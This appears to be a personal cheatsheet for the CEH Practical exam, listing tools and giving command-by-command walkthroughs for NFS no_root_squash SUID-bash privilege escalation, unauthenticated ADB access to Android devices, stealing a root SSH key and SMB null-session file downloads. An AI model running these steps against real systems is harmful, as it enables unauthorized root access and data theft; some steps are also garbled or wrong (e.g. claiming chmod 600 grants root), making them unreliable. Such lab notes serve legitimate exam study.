# CEH_PRACTICAL
This my cheatsheet that i used to study for CEH_PRACTICAL
Tools
1.	Nmap/Zenmap
2.	Wireshark
3.	Metasploit
4.	Hydra
5.	Cryptool / BCTextEncoder
6.	Veracrypt
7.	Burp suite
8.	Hydra
9.	Hashes.com/HashMyfiles/HashCalc
10.	Snow steganography/OpenStego/Covert TCP
11.	SQL Injection / nslookup/sqlmap/nikto
12.	Android Debugging Bridge (adb)
# PRACTICAL TIME
https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
https://github.com/CyberHackPr/CEH_PRACTICAL/pulls Click Here for Notes
**xfreerdp /u:[username] /p:[password] /v:[ip_address]** 
Exam RoadMap
1,2,8,11,12,16,17,18,20,7 (10 marks)  10,19,4,5,15,14,13,6,3,9  

**Priviledge Escalation**
**Misconfigured nfs shares**
**Victim machine log in to target or ssh into it**
1. root@ubuntu:~# Sudo apt-get update
2. root@ubuntu:~# Sudo apt install nfs-kernel-server
3. root@ubuntu:~# sudo nano etc/exports 
>> This is what you add the entry inside the exports file:  /home   *(rw,no_root_squash)
4. root@ubuntu:~# sudo /etc/init.d/nfs-kernel-server restart (you have to restart the server)
5. root@ubuntu:~#
**Attacker machine**
You should see port 2049 open after scanning 
1. attacker@parrot:~#sudo nmap -sV [IP]
2. Do this manually nfs enumerate 
3. attacker@parrot:~# apt-get install nfs-common 
4. attacker@parrot:~#showmount -e [IP Addrr]) or attacker@parrot:~#sudo nmap -sV --script=nfs-showmount [victim IP]
5. attacker@parrot:~#mkdir  /tmp/nfs
6. attacker@parrot:~#sudo mount -t nfs [IP]:/home  /tmp/nfs
7. attacker@parrot:~#cd  /tmp/nfs
8. attacker@parrot:~#sudo cp /bin/bash .
9. attacker@parrot:~#sudo chmod +s bash
10. attacker@parrot:~#ls -la bash (you can see all the privileges) 
11. ttacker@parrot:~#ssh ubuntu@[IP] (now we can ssh into our target machine) 
12. attacker@parrot:~#cd /home
13. attacker@parrot:~#ls -la
14. attacker@parrot:~#./bash -p 
15. id
16. whoami

Priviledge Escalation 2
Exploiting misconfigured NFS (port 2049)
1.	nmap -sV —p 2049 IP/Subnet
2.	sudo apt-get install nfs-common
3.	nmap -sV —script=nfs-showmount <Target_IP>
4.	check available mounts: showmount -e <Target_IP> -> we will see /home directory
5.	mkdir /tmp/nfs
6.	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
7.	cd /tmp/nfs
8.	sudo cp /bin/bash .
9.	sudo chmod +s bash -> it will be highlighted in red
10.	ls -la
11.	sudo df -h
12.	sudo chmod +s bash
after them, In another terminal:
	1. Access to target using SSH
	2. ./bash -p and we're root!
	3. cd /home
	4. ls -la
	5. Find the flag: find / -name "*.txt" -ls 2> /dev/null



**ADB Android Hacking** 
Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
1.	Scan adb port: nmap ip -sV -p 5555
2.	Connect adb: adb connect IP:5555
3.	Access mobile device: adb shell
4.	Elevate privilege using: sudo -i (if it is possile)
5.	pwd --> ls --> cd sdcard/Notifications/Scan --> ls --> cat secret.txt (If you can't find, check in others folders)
6.	Download files: adb pull /sdcard/Notifications/Scan Do it in another shell, without adb connection!
7.	We've three elf files, now we need to calculate entropy for each of them using this command: ent file.elf
8.	After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: sha384sum file.elf and consider only the last 4 digits of the hash result.

Vertical Privilege escalation 
1. ssh smith@Ip –p 1337
2. sudo -L to check on users
3. cd /root then ls to see the .txt file, try to cat the file but permission is denied
4. then find the .ssh file 
5. then you cat id_rsa file key. Copy the key from beginning to end then nano id_rsa and paste the key
6. chmod 600 id_rsa  this give it root privileges 
7. as you are logged ,ssh root@ipaddrr –p 1336 –I id_rsa then you will have performed a vertical privilege escalation 

SMB Connection
1. smbclient -L <TARGET_IP> -N
2. smbclient -L <TARGET_IP> -U <USER>
3. smbclient //<TARGET_IP>/<USER> -U <USER>
4. smbclient //<TARGET_IP>/admin -U admin
5. smbclient //<TARGET_IP>/public -N #NULL Session
## SMBCLIENT
1. smbclient //<TARGET_IP>/share_name
2. help
3. ls
4. get <filename>

smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
